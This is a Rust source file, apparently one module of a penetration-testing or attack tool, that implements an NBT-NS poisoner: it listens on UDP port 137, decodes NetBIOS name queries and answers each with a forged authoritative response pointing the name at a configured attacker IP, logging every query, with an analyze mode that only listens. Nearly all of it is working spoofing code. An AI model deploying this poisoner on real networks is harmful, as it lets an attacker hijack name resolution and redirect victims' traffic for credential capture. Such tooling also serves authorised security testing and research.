//! NetBIOS-Name-Service (NBT-NS) poisoner. Listens on UDP 137 and answers name queries.

use std::net::{Ipv4Addr, SocketAddr};
use std::sync::Arc;

use crate::capture::CaptureSink;
use crate::capture::model::Protocol;
use crate::logger::Logger;

use super::{PoisonConfig, query_event};

/// A decoded NBT-NS query.
#[derive(Clone, Debug)]
pub struct Query {
    pub txid: u16,
    pub name: String,
    pub name_type: u8,
    /// Raw question bytes (encoded name + type + class) so we can echo them verbatim.
    pub question: Vec<u8>,
}

/// Decode a NetBIOS first-level-encoded name (32 chars �2 16 bytes).
fn decode_name(encoded: &[u8]) -> (String, u8) {
    if encoded.len() < 32 {
        return (String::new(), 0);
    }
    let mut bytes = [0u8; 16];
    for i in 0..16 {
        let hi = encoded[i * 2].wrapping_sub(b'A') & 0x0f;
        let lo = encoded[i * 2 + 1].wrapping_sub(b'A') & 0x0f;
        bytes[i] = (hi << 4) | lo;
    }
    let name = String::from_utf8_lossy(&bytes[0..15])
        .trim_end()
        .to_string();
    (name, bytes[15])
}

/// Parse an NBT-NS query packet.
pub fn parse(buf: &[u8]) -> Option<Query> {
    if buf.len() < 12 {
        return None;
    }
    let txid = u16::from_be_bytes([buf[0], buf[1]]);
    let flags = u16::from_be_bytes([buf[2], buf[3]]);
    if flags & 0x8000 != 0 {
        return None; // a response, not a query
    }
    let qdcount = u16::from_be_bytes([buf[4], buf[5]]);
    if qdcount == 0 {
        return None;
    }
    // Question: length byte (0x20), 32 encoded chars, 0x00, type(2), class(2)
    if buf.len() < 12 + 1 + 32 + 1 + 4 {
        return None;
    }
    let name_len = buf[12] as usize;
    if name_len != 32 {
        return None;
    }
    let encoded = &buf[13..13 + 32];
    let (name, name_type) = decode_name(encoded);
    let question = buf[12..12 + 1 + 32 + 1 + 4].to_vec();
    Some(Query {
        txid,
        name,
        name_type,
        question,
    })
}

/// Build a positive name-query response claiming `ip`.
pub fn build_response(q: &Query, ip: Ipv4Addr, ttl: u32) -> Vec<u8> {
    let mut out = Vec::new();
    out.extend_from_slice(&q.txid.to_be_bytes());
    out.extend_from_slice(&0x8400u16.to_be_bytes()); // response, authoritative
    out.extend_from_slice(&1u16.to_be_bytes()); // QDCOUNT
    out.extend_from_slice(&1u16.to_be_bytes()); // ANCOUNT
    out.extend_from_slice(&0u16.to_be_bytes()); // NSCOUNT
    out.extend_from_slice(&0u16.to_be_bytes()); // ARCOUNT
    out.extend_from_slice(&q.question);
    // Answer
    out.extend_from_slice(&q.question[0..1 + 32 + 1]); // encoded name
    out.extend_from_slice(&0x0020u16.to_be_bytes()); // NB
    out.extend_from_slice(&0x0001u16.to_be_bytes()); // IN
    out.extend_from_slice(&ttl.to_be_bytes());
    out.extend_from_slice(&6u16.to_be_bytes()); // RDLENGTH
    out.extend_from_slice(&[0x00, 0x00]); // flags
    out.extend_from_slice(&ip.octets());
    out
}

pub async fn run(
    bind: SocketAddr,
    cfg: Arc<PoisonConfig>,
    sink: CaptureSink,
    logger: Arc<Logger>,
) -> anyhow::Result<()> {
    let sock = super::bind_udp(bind, true, None)?;
    logger.info(&format!("NBT-NS poisoned on {bind}"));
    let mut buf = vec![0u8; 65535];
    loop {
        let (n, src) = sock.recv_from(&mut buf).await?;
        let Some(q) = parse(&buf[..n]) else {
            continue;
        };
        if src.ip() == std::net::IpAddr::V4(cfg.answer_ipv4) {
            continue;
        }
        let answered = !cfg.analyze;
        sink.query(query_event(
            Protocol::NbtNs,
            src.ip(),
            &q.name,
            &format!("NB(0x{:02x})", q.name_type),
            answered,
            cfg.analyze,
        ));
        if !cfg.analyze {
            let resp = build_response(&q, cfg.answer_ipv4, cfg.ttl.resolve());
            let _ = sock.send_to(&resp, src).await;
        }
    }
}
